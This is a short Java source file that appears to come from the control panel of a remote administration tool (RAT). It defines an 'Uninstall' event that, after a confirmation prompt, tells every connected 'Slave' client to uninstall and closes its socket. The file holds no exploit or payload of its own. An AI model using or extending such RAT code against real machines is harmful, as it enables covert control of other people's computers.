package com.redpois0n.events;

import javax.swing.ImageIcon;

import com.redpois0n.Slave;
import com.redpois0n.exceptions.CloseException;
import com.redpois0n.packets.outgoing.Header;
import com.redpois0n.utils.IconUtils;
import com.redpois0n.utils.Util;


public class UninstallEvent extends Event {

	public ImageIcon icon = IconUtils.getIcon(getIcon(), true);

	public UninstallEvent(String name) {
		super(name);
	}

	@Override
	public Object[] getDisplayData() {
		return new Object[] { icon, super.name, toString() };
	}

	@Override
	public void perform(Slave sl) {
		try {
			sl.addToSendQueue(Header.UNINSTALL);
			sl.closeSocket(new CloseException("Uninstalling"));
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	@Override
	public String toString() {
		return "Uninstall";
	}

	@Override
	public boolean add() {
		return Util.yesNo("Confirm", "This will uninstall all connected servers, are you sure?");
	}

	@Override
	public String getIcon() {
		return "exit";
	}

}
